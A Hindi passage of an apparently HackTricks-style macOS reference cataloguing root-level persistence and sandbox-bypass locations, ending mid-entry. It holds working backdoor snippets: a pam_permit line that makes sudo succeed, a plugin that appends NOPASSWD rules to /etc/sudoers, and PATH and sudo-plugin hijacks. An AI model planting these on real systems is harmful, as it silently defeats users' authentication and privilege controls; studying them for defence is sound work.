- **`$(python3 -m site --user-site)/*.pth`** (macOS framework builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Root की आवश्यकता नहीं (user-writable)
  - **Trigger**: उस Python build का startup, जिसमें उसका user site enabled हो; `site` module active site directories में `.pth` files को process करता है
- **`<user-site>/usercustomize.py`**
  - Root की आवश्यकता नहीं
  - **Trigger**: user site enabled होने पर startup (`site` इसे auto-import करता है)
- **`<prefix>/site-packages/sitecustomize.py`** (जैसे `/opt/homebrew/lib/python3.13/site-packages/`, या system paths)
  - Interpreter की location के आधार पर root/admin की आवश्यकता हो सकती है
  - **Trigger**: ऐसे interpreter का startup जिसमें वह site directory शामिल हो

#### Description & Exploitation

Startup पर Python आम तौर पर `site` import करता है और अपनी active `site-packages` directories में `.pth` files scan करता है। Paths जोड़ने के अलावा, `import ` से शुरू होने वाली `.pth` line Python code execute करती है, भले ही नामित module का अन्यथा कभी उपयोग न किया जाए। Python `sitecustomize` और, **user site enabled होने पर**, `usercustomize` को भी import करने की कोशिश करता है।<sup>[[56]](#references)</sup> Trigger तब होता है जब बाद में कोई interpreter शुरू होता है जो modified directory को देखता है। `-S` से `site` processing बंद हो जाती है; `-s`, `-I` या `PYTHONNOUSERSITE` से **user-site** variants बंद हो जाते हैं। `-I` आम तौर पर global `sitecustomize` को बंद नहीं करता। Virtual environments user site को बाहर भी रख सकते हैं। विशिष्ट interpreter के लिए `python3 -m site` जाँचें।

निम्नलिखित PoC macOS 26.5.2 पर चलाया गया था। इस test के लिए `PYTHONUSERBASE` user site को एक temporary directory में ले जाता है; किसी वास्तविक user site में बदलाव नहीं किया जाता:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Both markers दिखाई दिए। `-s`, `-I`, या `-S` के साथ दोहराने पर इस परीक्षण में दोनों **user-site** markers नहीं दिखे। किसी global site directory में `sitecustomize` का परीक्षण नहीं किया गया।

## Root Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिलेंगी, जिनसे आप **root** रहते हुए और/या **अन्य अजीब शर्तों** के तहत किसी चीज़ को **फ़ाइल में लिखकर** आसानी से execute कर सकते हैं।

### Periodic

> [!CAUTION]
> **ऐतिहासिक mechanism:** macOS 26.5.2 test machine पर `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic`, और `com.apple.periodic-*` launch daemons मौजूद नहीं हैं। यह न मानें कि मौजूदा system पर `/etc/periodic` बनाने से उसकी सामग्री schedule हो जाएगी। नीचे दिए गए उदाहरण का उपयोग करने से पहले target release पर command और enabled scheduler, दोनों की जाँच करें।

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन इसके लिए आपको root होना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Root आवश्यक है
  - **ट्रिगर**: समय आने पर
- `/etc/daily.local`, `/etc/weekly.local` या `/etc/monthly.local`
  - Root आवश्यक है
  - **ट्रिगर**: समय आने पर

#### विवरण और Exploitation

पुराने releases पर, periodic scripts (**`/etc/periodic`**) को `/System/Library/LaunchDaemons/com.apple.periodic*` में मौजूद **launch daemons** schedule करते थे। macOS Big Sur 11.5 से, periodic runner ने periodic directories में मौजूद scripts को हर **फ़ाइल के owner** के रूप में execute किया, जिससे privilege-escalation का पुराना रास्ता बंद हो गया।<sup>[[27]](#references)</sup> नीचे दिए गए commands और directory listings ऐतिहासिक output हैं, macOS 26.5.2 पर किए गए परीक्षण के परिणाम नहीं।

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

अन्य periodic scripts भी हैं, जिन्हें **`/etc/defaults/periodic.conf`** में बताया गया है और जो execute की जाएँगी:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

पुराने सिस्टम पर, जहाँ `periodic` और उसके launch daemons इंस्टॉल और सक्षम हों, `/etc/daily.local`, `/etc/weekly.local`, और `/etc/monthly.local` अतिरिक्त execution paths थे। एक हानिरहित, केवल-पढ़ने वाली जाँच यह है:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> periodic directories में मौजूद scripts पर owner-based rule लागू होता था। ऐतिहासिक `999.local` wrapper, `/etc/daily.local`, `/etc/weekly.local`, या `/etc/monthly.local` को उसी ownership check के बिना source करता था; जब scheduler root के रूप में चलता था, तो ये local files root के रूप में चलती थीं। यह अंतर और Big Sur 11.5 में हुआ बदलाव [original research](https://theevilbit.github.io/beyond/beyond_0019/) में दर्ज हैं। `periodic` मौजूद न होने पर इनमें से किसी भी path को active नहीं मानना चाहिए।

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपको root होना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- हमेशा root आवश्यक है

#### विवरण और Exploitation

चूँकि PAM, macOS के अंदर आसानी से execution कराने के बजाय **persistence** और malware पर अधिक केंद्रित है, इसलिए यह blog विस्तृत व्याख्या नहीं देगा। **इस technique को बेहतर ढंग से समझने के लिए writeups पढ़ें**।<sup>[[28]](#references)</sup>

PAM modules को इससे जाँचें:

```bash
ls -l /etc/pam.d
```

PAM का दुरुपयोग करने वाली persistence/privilege escalation तकनीक इतनी आसान है कि module /etc/pam.d/sudo को संशोधित करके शुरुआत में यह पंक्ति जोड़ दें:

```bash
auth       sufficient     pam_permit.so
```

तो यह कुछ ऐसा **दिखेगा**:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

और इसलिए **`sudo` का इस्तेमाल करने की कोई भी कोशिश सफल होगी**।

> [!CAUTION]
> ध्यान दें कि यह डायरेक्टरी TCC द्वारा सुरक्षित है, इसलिए बहुत संभव है कि उपयोगकर्ता को access की अनुमति माँगने वाला prompt दिखाई दे।

एक और अच्छा उदाहरण su है, जहाँ आप देख सकते हैं कि PAM modules को parameters देना भी संभव है (और आप इस फ़ाइल में backdoor भी डाल सकते हैं):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपको root होना चाहिए और अतिरिक्त configs बनाने होंगे
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
  - Root की आवश्यकता है
  - Plugin का उपयोग करने के लिए authorization database configure करना भी आवश्यक है

#### Description & Exploitation

आप एक authorization plugin बना सकते हैं, जिसे persistence बनाए रखने के लिए user के login करने पर execute किया जाएगा। इन plugins को बनाने के तरीके के बारे में अधिक जानकारी के लिए पिछले writeups देखें (और सावधान रहें, खराब तरीके से लिखा गया plugin आपको अपने सिस्टम से lock out कर सकता है और आपको अपने Mac को recovery mode से साफ़ करना होगा)।<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**लोड किए जाने वाले स्थान पर bundle ले जाएँ:**

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

अंत में इस Plugin को लोड करने के लिए **rule** जोड़ें:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** authorization framework को बताएगा कि authorization के लिए उसे **एक external mechanism को call करना होगा**। इसके अलावा, **`privileged`** इसे root के रूप में execute करवाएगा।

इसे इससे trigger करें:

```bash
security authorize com.asdf.asdf
```

और फिर **staff group** के पास sudo access होना चाहिए (पुष्टि करने के लिए `/etc/sudoers` पढ़ें)।

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Sandbox bypass के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन इसके लिए root होना ज़रूरी है और user को man का उपयोग करना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
  - Root आवश्यक है
  - **`/private/etc/man.conf`**: जब भी man का उपयोग किया जाता है

#### Description & Exploit

Config file **`/private/etc/man.conf`** यह बताती है कि man documentation files खोलते समय कौन-सा binary/script उपयोग करना है। इसलिए executable का path बदला जा सकता है, ताकि user जब भी कुछ docs पढ़ने के लिए man का उपयोग करे, तो एक backdoor execute हो जाए।<sup>[[31]](#references)</sup>

उदाहरण के लिए, **`/private/etc/man.conf`** में यह सेट करें:

```
MANPAGER /tmp/view
```

और फिर `/tmp/view` को इस प्रकार बनाएँ:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**लेख**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपके पास root access होना चाहिए और apache चल रहा होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd के पास entitlements नहीं हैं

#### लोकेशन

- **`/etc/apache2/httpd.conf`**
  - Root access आवश्यक
  - ट्रिगर: Apache2 शुरू होने पर

#### विवरण और Exploit

आप `/etc/apache2/httpd.conf` में इस तरह की एक लाइन जोड़कर किसी module को लोड करने का निर्देश दे सकते हैं:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

इस तरह आपका compiled module Apache द्वारा load किया जाएगा। बस, आपको इसे **वैध Apple certificate से sign करना होगा**, या system में **नया trusted certificate जोड़कर उससे sign करना होगा**।

फिर, ज़रूरत पड़ने पर यह सुनिश्चित करने के लिए कि server शुरू हो जाए, आप यह execute कर सकते हैं:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Dylb के लिए कोड उदाहरण:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

लेख: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आपके पास root access होना चाहिए, auditd चल रहा होना चाहिए और warning ट्रिगर होनी चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
  - Root access आवश्यक
  - **Trigger**: जब auditd warning का पता लगाता है

#### विवरण और Exploit

जब भी auditd किसी warning का पता लगाता है, तो script **`/etc/security/audit_warn`** **चलाया जाता है**। इसलिए आप इसमें अपना payload जोड़ सकते हैं।<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

आप `sudo audit -n` चलाकर चेतावनी ज़बरन दिखा सकते हैं।

### Startup Items

> [!CAUTION] > **यह deprecated है, इसलिए उन directories में कुछ भी नहीं मिलना चाहिए।**

**StartupItem** एक directory है, जिसे `/Library/StartupItems/` या `/System/Library/StartupItems/` में होना चाहिए। यह directory बनाने के बाद, इसमें ये दो विशिष्ट फ़ाइलें होनी चाहिए:

1. एक **rc script**: startup पर चलने वाली shell script।
2. एक **plist फ़ाइल**, जिसका नाम `StartupParameters.plist` होना चाहिए और जिसमें विभिन्न configuration settings होती हैं।

सुनिश्चित करें कि startup process द्वारा पहचाने और उपयोग किए जाने के लिए, rc script और `StartupParameters.plist` फ़ाइल दोनों **StartupItem** directory के भीतर सही जगह पर रखी गई हों।

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> मुझे अपने macOS में यह component नहीं मिला, इसलिए अधिक जानकारी के लिए writeup देखें।

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple द्वारा पेश किया गया **emond** एक logging mechanism है, जो अधूरा विकसित या संभवतः छोड़ दिया गया लगता है, फिर भी इसका उपयोग किया जा सकता है। Mac administrator के लिए यह विशेष रूप से उपयोगी नहीं है, लेकिन यह अस्पष्ट service threat actors के लिए persistence का एक गुप्त तरीका हो सकती है, जिस पर macOS admins का ध्यान जाने की संभावना कम है।<sup>[[34]](#references)</sup>

जिन लोगों को इसके अस्तित्व की जानकारी है, उनके लिए **emond** के किसी भी malicious usage की पहचान करना आसान है। इस service का system LaunchDaemon scripts को execute करने के लिए एक ही directory में खोजता है। इसकी जाँच के लिए यह command इस्तेमाल किया जा सकता है:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### स्थान

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root आवश्यक है
  - **ट्रिगर**: XQuartz के साथ

#### विवरण और Exploit

XQuartz अब **macOS में इंस्टॉल नहीं होता**, इसलिए अधिक जानकारी के लिए writeup देखें।<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> kext इंस्टॉल करना इतना जटिल है—यहाँ तक कि root के रूप में भी—कि जब तक आपके पास कोई exploit न हो, इसे व्यावहारिक sandbox-escape या persistence तकनीक नहीं माना जाता।

#### स्थान

KEXT को startup item के रूप में इंस्टॉल करने के लिए, उसे **निम्नलिखित स्थानों में से किसी एक पर इंस्टॉल करना आवश्यक है**:

- `/System/Library/Extensions`
  - OS X ऑपरेटिंग सिस्टम में शामिल KEXT फ़ाइलें।
- `/Library/Extensions`
  - तृतीय-पक्ष सॉफ़्टवेयर द्वारा इंस्टॉल की गई KEXT फ़ाइलें

आप वर्तमान में लोड की गई kext फ़ाइलों की सूची इस कमांड से देख सकते हैं:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

For more information about [**kernel extensions इस section में देखें**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### स्थान

- **`/usr/local/bin/amstoold`**
  - Root आवश्यक है

#### विवरण और Exploitation

ऐसा लगता है कि `/System/Library/LaunchAgents/com.apple.amstoold.plist` का `plist` इस binary का उपयोग कर रहा था और एक XPC service expose कर रहा था... समस्या यह थी कि binary मौजूद नहीं थी, इसलिए आप वहाँ कोई चीज़ रख सकते थे और XPC service कॉल होने पर आपकी binary कॉल की जाती।<sup>[[35]](#references)</sup>

मुझे अब यह अपने macOS में नहीं मिल रहा।

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### स्थान

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root आवश्यक है
  - **ट्रिगर**: जब service चलाई जाती है (शायद ही कभी)

#### विवरण और exploit

ऐसा लगता है कि इस script को चलाना बहुत आम नहीं है और मुझे यह अपने macOS में भी नहीं मिली, इसलिए अधिक जानकारी के लिए writeup देखें।<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **यह आधुनिक MacOS versions में काम नहीं करता**

यहाँ **ऐसे commands रखना भी संभव है जो startup पर execute होंगे।** एक सामान्य rc.common script का उदाहरण:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd Boot Tasks

लेख: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (root की ज़रूरत है)
- root आवश्यक है, साथ ही path के आधार पर **SIP bypass** या **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access permission में से किसी एक की ज़रूरत है

#### स्थान

`launchd` अपने **`__TEXT,__config`** section में एक plist एम्बेड करता है, जो शुरुआती "boot tasks" का वर्णन करती है। कई संदर्भ scripts/binaries, जो डिफ़ॉल्ट रूप से मौजूद **नहीं** होते और जिन्हें attacker बना सकता है:

- SIP-bypass set: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA set: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` केवल Sequoia+ पर पहले से मौजूद होता है)

#### विवरण और Exploitation

यह देखने के लिए कि `launchd` कौन-सी files चलाएगा और कौन-सी keys समर्थित हैं (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…): एम्बेडेड task table dump करें

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

रेफ़रेंस की गई फ़ाइलों में से कोई एक (जैसे `/etc/rc.server`) बनाने पर, अगले (userspace) रीबूट के दौरान `launchd` उसे execute करेगा। सबसे उपयोगी entries पर SIP की पाबंदी है या उनके लिए TCC SysAdminFiles/Full Disk Access आवश्यक है, इसलिए यह root-level, रीबूट से ट्रिगर होने वाली technique है।<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

`rc.trampoline` boot task, boot के समय `apple-trusted-trampoline` NVRAM variable में स्टोर की गई **platform (Apple-signed) binary** चलाता है, लेकिन **केवल तभी जब `rc.trampoline=1` boot-arg सेट हो और SIP disabled हो** (इस पर ~390&nbsp;KB की size limit और blocking/return-fast constraint है)। चूँकि इसके लिए **root + SIP disabled + Apple-signed payload** आवश्यक है, इसलिए असल दुनिया में persistence के लिए यह लगभग अव्यावहारिक है और यहाँ केवल पूर्णता के लिए शामिल है।<sup>[[41]](#references)</sup>

### /etc/paths और /etc/paths.d (PATH hijack)

- sandbox को bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (लिखने के लिए root चाहिए)
- root आवश्यक

#### Location

- **`/etc/paths`** और **`/etc/paths.d/*`** — login के समय default `PATH` बनाने के लिए इन्हें **`path_helper`** पढ़ता है (`/etc/zprofile` से invoke किया जाता है)।

#### Description & Exploitation

दोनों root-owned हैं। किसी attacker-controlled directory को सबसे आगे जोड़ने से (`/etc/paths` को edit करके या `/etc/paths.d/` में फ़ाइल डालकर), हर नए login shell के `PATH` में वह directory शुरुआती स्थान पर आ जाती है। इसलिए किसी आम command (`ls`, `git`, …) के नाम वाली malicious binary असली binary को **shadow** करती है और अगली बार victim के उसे invoke करने पर चलती है।

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (root की आवश्यकता है)
- Root आवश्यक; परिणामस्वरूप **SIP bypass** होता है। प्रभावित macOS संस्करण: **15.0–15.1**, और इसे **15.2** में ठीक किया गया।

#### Location

- **`/Library/Filesystems/`** में filesystem bundle डालें।

#### Description & Exploitation

`storagekitd` के पास entitlement **`com.apple.rootless.install.heritable`** है और यह filesystem bundles की binaries को इस SIP-bypassing क्षमता के साथ **inherited** रूप में spawn करता था। एक malicious filesystem bundle रखकर, attacker SIP bypass के साथ code चला सकता था और **persistent kernel extensions** install कर सकता था या SIP-protected `LaunchDaemon` directories में लिख सकता था — ऐसी persistence जो सामान्य protections को मात देकर बनी रहती है।<sup>[[46]](#references)</sup> Apple ने इसे macOS Sequoia 15.2 में ठीक किया।

### sudo plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Sandbox bypass करने के लिए उपयोगी: [🔴](https://emojipedia.org/large-red-circle) (`/etc/sudo.conf` में लिखने के लिए root की आवश्यकता है)
- Install करने के लिए root आवश्यक; इसके बाद plugin **हर `sudo` invocation** के अंदर चलता है (setuid-root context)

#### Location

- **`/etc/sudo.conf`** — `Plugin` lines, **`/usr/libexec/sudo/`** (या किसी absolute path) से shared objects load करती हैं। यह फ़ाइल default रूप से मौजूद नहीं होती (sudo built-in policy का उपयोग करता है), इसलिए इसे बनाना एक clean hook है।

#### Description & Exploitation

`sudo`, अपनी policy/approval/audit plugins को `/etc/sudo.conf` से load करता है। `sudo` setuid-root होने के कारण, malicious shared-object plugin **हर बार जब कोई user `sudo` चलाता है, root privileges के साथ execute होता है** — यह durable root persistence देता है और हर sudo command को भी देखता है।<sup>[[51]](#references)</sup> macOS में sudo 1.9.x आता है, जो plugin API को support करता है।

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
न्यूनतम उदाहरण: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Legacy mechanism:** macOS 12.3 से Deprecated। macOS 14.1 और इसके बाद के संस्करणों में legacy video plug-ins डिफ़ॉल्ट रूप से disabled होते हैं। इस path के काम करने से पहले user को Recovery से legacy video support बहाल करना होगा; केवल writable directory होना पर्याप्त नहीं है। [Apple की मौजूदा support guidance](https://support.apple.com/en-us/108387)।
- Plug-in directory में लिखने के लिए Root आवश्यक है। किसी भी code execution के लिए ऐसे compatible client की आवश्यकता है जो अभी भी DAL plug-ins load करता हो; macOS 26 पर इसका runtime परीक्षण नहीं किया गया।

#### स्थान

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root आवश्यक
  - **Trigger:** legacy support बहाल किए जाने **के बाद**, कोई compatible camera client devices enumerate करता है। Client library validation किसी third-party plug-in को block कर सकता है।

#### विवरण और Exploitation

